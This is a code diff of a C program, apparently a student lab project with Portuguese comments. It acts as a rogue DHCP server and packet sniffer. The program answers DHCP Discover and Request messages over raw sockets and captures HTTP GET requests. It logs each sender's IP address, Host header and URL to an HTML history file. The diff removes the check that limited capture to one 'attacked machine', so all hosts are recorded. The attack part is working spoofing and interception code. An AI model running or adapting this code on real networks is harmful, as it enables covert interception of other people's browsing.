@@ -23,6 +23,144 @@
 #include <time.h>
 #include <netinet/in_systm.h> 
 
+
+
+#define DHCP_UDP_OVERHEAD   (14 + /* Ethernet header */     \
+                             20 + /* IP header */           \
+                              8)   /* UDP header */
+#define DHCP_SNAME_LEN      64
+#define DHCP_FILE_LEN       128
+#define DHCP_FIXED_NON_UDP  236
+#define DHCP_FIXED_LEN      (DHCP_FIXED_NON_UDP + DHCP_UDP_OVERHEAD)
+                        /* Everything but options. */
+#define DHCP_MTU_MAX        1500
+#define DHCP_OPTION_LEN     (DHCP_MTU_MAX - DHCP_FIXED_LEN)
+ 
+#define BOOTP_MIN_LEN       300
+#define DHCP_MIN_LEN            548
+/* BOOTP (rfc951) message types */
+#define BOOTREQUEST 1
+#define BOOTREPLY   2
+ 
+/* Possible values for flags field... */
+#define BOOTP_BROADCAST 32768L
+ 
+/* Possible values for hardware type (htype) field... */
+#define HTYPE_ETHER 1               /* Ethernet 10Mbps              */
+#define HTYPE_IEEE802   6               /* IEEE 802.2 Token Ring... */
+#define HTYPE_FDDI  8       /* FDDI...          */
+ 
+/* Magic cookie validating dhcp options field (and bootp vendor
+   extensions field). */
+#define DHCP_OPTIONS_COOKIE "\143\202\123\143"
+ 
+/* DHCP Option codes: */
+ 
+#define DHO_PAD             0
+#define DHO_SUBNET_MASK         1
+#define DHO_TIME_OFFSET         2
+#define DHO_ROUTERS         3
+#define DHO_TIME_SERVERS        4
+#define DHO_NAME_SERVERS        5
+#define DHO_DOMAIN_NAME_SERVERS     6
+#define DHO_LOG_SERVERS         7
+#define DHO_COOKIE_SERVERS      8
+#define DHO_LPR_SERVERS         9
+#define DHO_IMPRESS_SERVERS     10
+#define DHO_RESOURCE_LOCATION_SERVERS   11
+#define DHO_HOST_NAME           12
+#define DHO_BOOT_SIZE           13
+#define DHO_MERIT_DUMP          14
+#define DHO_DOMAIN_NAME         15
+#define DHO_SWAP_SERVER         16
+#define DHO_ROOT_PATH           17
+#define DHO_EXTENSIONS_PATH     18
+#define DHO_IP_FORWARDING       19
+#define DHO_NON_LOCAL_SOURCE_ROUTING    20
+#define DHO_POLICY_FILTER       21
+#define DHO_MAX_DGRAM_REASSEMBLY    22
+#define DHO_DEFAULT_IP_TTL      23
+#define DHO_PATH_MTU_AGING_TIMEOUT  24
+#define DHO_PATH_MTU_PLATEAU_TABLE  25
+#define DHO_INTERFACE_MTU       26
+#define DHO_ALL_SUBNETS_LOCAL       27
+#define DHO_BROADCAST_ADDRESS       28
+#define DHO_PERFORM_MASK_DISCOVERY  29
+#define DHO_MASK_SUPPLIER       30
+#define DHO_ROUTER_DISCOVERY        31
+#define DHO_ROUTER_SOLICITATION_ADDRESS 32
+#define DHO_STATIC_ROUTES       33
+#define DHO_TRAILER_ENCAPSULATION   34
+#define DHO_ARP_CACHE_TIMEOUT       35
+#define DHO_IEEE802_3_ENCAPSULATION 36
+#define DHO_DEFAULT_TCP_TTL     37
+#define DHO_TCP_KEEPALIVE_INTERVAL  38
+#define DHO_TCP_KEEPALIVE_GARBAGE   39
+#define DHO_NIS_DOMAIN          40
+#define DHO_NIS_SERVERS         41
+#define DHO_NTP_SERVERS         42
+#define DHO_VENDOR_ENCAPSULATED_OPTIONS 43
+#define DHO_NETBIOS_NAME_SERVERS    44
+#define DHO_NETBIOS_DD_SERVER       45
+#define DHO_NETBIOS_NODE_TYPE       46
+#define DHO_NETBIOS_SCOPE       47
+#define DHO_FONT_SERVERS        48
+#define DHO_X_DISPLAY_MANAGER       49
+#define DHO_DHCP_REQUESTED_ADDRESS  50
+#define DHO_DHCP_LEASE_TIME     51
+#define DHO_DHCP_OPTION_OVERLOAD    52
+#define DHO_DHCP_MESSAGE_TYPE       53
+#define DHO_DHCP_SERVER_IDENTIFIER  54
+#define DHO_DHCP_PARAMETER_REQUEST_LIST 55
+#define DHO_DHCP_MESSAGE        56
+#define DHO_DHCP_MAX_MESSAGE_SIZE   57
+#define DHO_DHCP_RENEWAL_TIME       58
+#define DHO_DHCP_REBINDING_TIME     59
+#define DHO_VENDOR_CLASS_IDENTIFIER 60
+#define DHO_DHCP_CLIENT_IDENTIFIER  61
+#define DHO_NWIP_DOMAIN_NAME        62
+#define DHO_NWIP_SUBOPTIONS     63
+#define DHO_USER_CLASS          77
+#define DHO_FQDN            81
+#define DHO_DHCP_AGENT_OPTIONS      82
+#define DHO_SUBNET_SELECTION        118 /* RFC3011! */
+/* The DHO_AUTHENTICATE option is not a standard yet, so I've
+   allocated an option out of the "local" option space for it on a
+   temporary basis.  Once an option code number is assigned, I will
+   immediately and shamelessly break this, so don't count on it
+   continuing to work. */
+#define DHO_AUTHENTICATE        210
+ 
+#define DHO_END             255
+ 
+/* DHCP message types. */
+#define DHCPDISCOVER    1
+#define DHCPOFFER   2
+#define DHCPREQUEST 3
+#define DHCPDECLINE 4
+#define DHCPACK     5
+#define DHCPNAK     6
+#define DHCPRELEASE 7
+#define DHCPINFORM  8
+ 
+/* Relay Agent Information option subtypes: */
+#define RAI_CIRCUIT_ID  1
+#define RAI_REMOTE_ID   2
+#define RAI_AGENT_ID    3
+ 
+/* FQDN suboptions: */
+#define FQDN_NO_CLIENT_UPDATE       1
+#define FQDN_SERVER_UPDATE      2
+#define FQDN_ENCODED            3
+#define FQDN_RCODE1         4
+#define FQDN_RCODE2         5
+#define FQDN_HOSTNAME           6
+#define FQDN_DOMAINNAME         7
+#define FQDN_FQDN           8
+#define FQDN_SUBOPTION_COUNT        8
+
+
+
 #define BUFFSIZE 1518
 
 // Atencao!! Confira no /usr/include do seu sisop o nome correto
@@ -108,7 +246,6 @@ char *hora(void){
     return retorno;   
 }
 
-//Calculo de checksum
 unsigned short in_cksum(unsigned short *addr,int len)
 {
         register int sum = 0;
@@ -187,7 +324,13 @@ void sendMessage(int acao, char *mac){
     char SourceHwaddr[17];
     char DestHwaddr[17];
  
-    
+    //Argumentos
+    // if (argc != 2)
+    // {
+    //     printf("Argumento da inteface eh necessario!\n");
+    //     exit(1);
+    // }
+ 
     //Cria um socket UDP com IP
     if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1)
     {
@@ -388,7 +531,7 @@ void sendMessage(int acao, char *mac){
 
 	dhcp->options[59]=255;
  
-    //Limpa o address e seta os dados
+    //clear the addr and set the data in it
     memset(&addr, 0, sizeof(struct sockaddr_ll));
     addr.sll_family = PF_PACKET;
     addr.sll_protocol = htons(ETH_P_ARP);
@@ -476,7 +619,7 @@ int main(int argc,char *argv[])
                     int dhcp = udp+8+1;
                     int macOrigem = dhcp + 245;
 					
-					if(buff1[dhcp + 241] == 0x01){ //Mensagem recebida eh discover
+					if(buff1[dhcp + 241] == 0x01){
 						mac[0] = buff1[6];
 						mac[1] = buff1[6+1];
 						mac[2] = buff1[6+2];
@@ -489,7 +632,7 @@ int main(int argc,char *argv[])
 						printf("DHCP Discover \n\n");
 						printf("-------------------------------\n");
 
-					}else{ //Mensagem recebida eh request
+					}else{
 						if(buff1[dhcp + 241] == 0x03){
 							sendMessage(1,mac);
 							printf("DHCP Request  \n\n");
@@ -508,122 +651,122 @@ int main(int argc,char *argv[])
             if(buff1[23] == 0x06){//TCP
                 
                 //Verifica se o pacote eh da maquina atacada.
-                if(buff1[14+12] == 0x0a && buff1[14+12] == 0x20 && buff1[14+12] == 0x8f  && buff1[14+12] == 0x1c){
+                //if(buff1[14+12] == 0x0a && buff1[14+12] == 0x20 && buff1[14+12] == 0x8f  && buff1[14+12] == 0x1c){
 
-                    int tcp = 14 + ipLength;
-                    int tcpLength = (int) (4*(buff1[tcp+12]/0x10));
+                int tcp = 14 + ipLength;
+                int tcpLength = (int) (4*(buff1[tcp+12]/0x10));
+                
+                if(buff1[tcp+3] == 0x50){ //HTTP -- porta 80
                     
-                    if(buff1[tcp+3] == 0x50){ //HTTP -- porta 80
+                    int http = 14 + ipLength + tcpLength;
+                    int httpLength = tcp+8+1+buff1[http+12];
+                    char b[2] ;
+                    
+                    if(buff1[http] == 0x47){ //GET
                         
-                        int http = 14 + ipLength + tcpLength;
-                        int httpLength = tcp+8+1+buff1[http+12];
-                        char b[2] ;
+                        int dom=0; 
+                        int flag = 0;
+                        FILE *arq;
+                        arq = fopen("/home/langhanz/Desktop/novo.html", "a");
                         
-                        if(buff1[http] == 0x47){ //GET
-                            
-                            int dom=0; 
-                            int flag = 0;
-                            FILE *arq;
-                            arq = fopen("./historico.html", "a");
-                            
-                            if(arq == NULL){
-                                printf("Erro, nao foi possivel abrir o arquivo\n");
+                        if(arq == NULL){
+                            printf("Erro, nao foi possivel abrir o arquivo\n");
+                        }
+                        
+                        char aux[100];
+                        sprintf(aux,"%s","<html>");
+                        fputs(aux, arq);//html
+
+                        while(flag==0){
+                            dom=0;
+
+                            sprintf(aux,"%s","<div style='background-color:#8FBC8F;margin:10px;padding:10px;'>");
+                            fputs(aux, arq);//div   
+
+                            for(dom=0;!(buff1[dom] == 0x48 && buff1[dom+1] == 0x6f && buff1[dom+2] == 0x73 && buff1[dom+3] == 0x74) && dom < 1500;dom++){
+                                
                             }
-                            
-                            char aux[100];
-                            sprintf(aux,"%s","<html>");
-                            fputs(aux, arq);//html
 
-                            //Percorre pacote para pagar os dados e gerar o historico
-                            while(flag==0){
-                                dom=0;
+                            if(ipVersion == 4){
+                                
+                                //Escreve IP
+                                char hex_num[2];
+                                sprintf(hex_num, "%x", (int)buff1[14+12]);
+                                int a = strtol(hex_num, NULL, 16);
+                                sprintf(hex_num, "%d", a);
+                                fputs(hex_num,arq);
+                                fputc(0x2e, arq);
 
-                                sprintf(aux,"%s","<div style='background-color:#8FBC8F;margin:10px;padding:10px;'>");
-                                fputs(aux, arq);//div   
+                                sprintf(hex_num, "%x", (int)buff1[14+13]);
+                                a = strtol(hex_num, NULL, 16);
+                                sprintf(hex_num, "%d", a);
+                                fputs(hex_num,arq);
+                                fputc(0x2e, arq);
 
-                                for(dom=0;!(buff1[dom] == 0x48 && buff1[dom+1] == 0x6f && buff1[dom+2] == 0x73 && buff1[dom+3] == 0x74) && dom < 1500;dom++){
-                                    
-                                }
+                                sprintf(hex_num, "%x", (int)buff1[14+14]);
+                                a = strtol(hex_num, NULL, 16);
+                                sprintf(hex_num, "%d", a);
+                                fputs(hex_num,arq);
+                                fputc(0x2e, arq);
 
-                                if(ipVersion == 4){
-                                    
-                                    //Escreve IP
-                                    char hex_num[2];
-                                    sprintf(hex_num, "%x", (int)buff1[14+12]);
-                                    int a = strtol(hex_num, NULL, 16);
-                                    sprintf(hex_num, "%d", a);
-                                    fputs(hex_num,arq);
-                                    fputc(0x2e, arq);
+                                sprintf(hex_num, "%x", (int)buff1[14+15]);
+                                a = strtol(hex_num, NULL, 16);
+                                sprintf(hex_num, "%d", a);
+                                fputs(hex_num,arq);
 
-                                    sprintf(hex_num, "%x", (int)buff1[14+13]);
-                                    a = strtol(hex_num, NULL, 16);
-                                    sprintf(hex_num, "%d", a);
-                                    fputs(hex_num,arq);
-                                    fputc(0x2e, arq);
-
-                                    sprintf(hex_num, "%x", (int)buff1[14+14]);
-                                    a = strtol(hex_num, NULL, 16);
-                                    sprintf(hex_num, "%d", a);
-                                    fputs(hex_num,arq);
-                                    fputc(0x2e, arq);
-
-                                    sprintf(hex_num, "%x", (int)buff1[14+15]);
-                                    a = strtol(hex_num, NULL, 16);
-                                    sprintf(hex_num, "%d", a);
-                                    fputs(hex_num,arq);
-
-                                    fputc(0x20, arq);
-                                    fputc(0x2d, arq);
-                                    fputc(0x20, arq);
-                                    
-                                }
-
-                                //Escreve data e hora
-                                char data_sistema[100],
-                                hora_sistema[100];
-                                sprintf(data_sistema,"%s%s",data()," ");
-                                sprintf(hora_sistema,"%s",hora());
-                                fputs(data_sistema, arq);
                                 fputc(0x20, arq);
                                 fputc(0x2d, arq);
                                 fputc(0x20, arq);
-                                fputs(hora_sistema, arq);
-
-                                sprintf(aux,"%s","</br>");
-                                fputs(aux, arq);
-
-                                for(dom;!(buff1[dom] == 0x0d && buff1[dom+1] == 0x0a);dom++){                            
-                                    sprintf(b,"%c",buff1[dom]);
-                                    printf("%s",b);
-                                    fputc(buff1[dom], arq);
-                                }  
                                 
-                                for(dom=0;!(buff1[dom] == 0x47 && buff1[dom+1] == 0x45 && buff1[dom+2] == 0x54) && dom < 1500;dom++){
-                                
-                                }
-                                
-                                dom = dom+4;
-                                for(dom;!(buff1[dom] == 0x20);dom++){                            
-                                    sprintf(b,"%c",buff1[dom]);
-                                    printf("%s",b);
-                                    fputc(buff1[dom], arq);
-                                }  
-
-                                sprintf(aux,"%s","</div>");
-                                fputs(aux, arq);//div 
-                                flag = 1;   
                             }
 
-                            sprintf(aux,"%s","</html>");
-                            fputs(aux, arq);//html
-                            fclose(arq);
-                        
-                            printf("\n");                        
+                            //Escreve data e hora
+                            char data_sistema[100],
+                            hora_sistema[100];
+                            sprintf(data_sistema,"%s%s",data()," ");
+                            sprintf(hora_sistema,"%s",hora());
+                            fputs(data_sistema, arq);
+                            fputc(0x20, arq);
+                            fputc(0x2d, arq);
+                            fputc(0x20, arq);
+                            fputs(hora_sistema, arq);
+
+                            sprintf(aux,"%s","</br>");
+                            fputs(aux, arq);
+
+                            for(dom;!(buff1[dom] == 0x0d && buff1[dom+1] == 0x0a);dom++){                            
+                                sprintf(b,"%c",buff1[dom]);
+                                printf("%s",b);
+                                fputc(buff1[dom], arq);
+                            }  
+                            
+                            for(dom=0;!(buff1[dom] == 0x47 && buff1[dom+1] == 0x45 && buff1[dom+2] == 0x54) && dom < 1500;dom++){
+                            
+                            }
+                            
+                            dom = dom+4;
+                            for(dom;!(buff1[dom] == 0x20);dom++){                            
+                                sprintf(b,"%c",buff1[dom]);
+                                printf("%s",b);
+                                fputc(buff1[dom], arq);
+                            }  
+
+                            sprintf(aux,"%s","</div>");
+                            fputs(aux, arq);//div 
+                            flag = 1;   
                         }
+
+                        sprintf(aux,"%s","</html>");
+                        fputs(aux, arq);//html
+                        fclose(arq);
+                    
+                        printf("\n");                        
                     }
                 }
             }
+            //}
 		}
 	}
 }
+
 
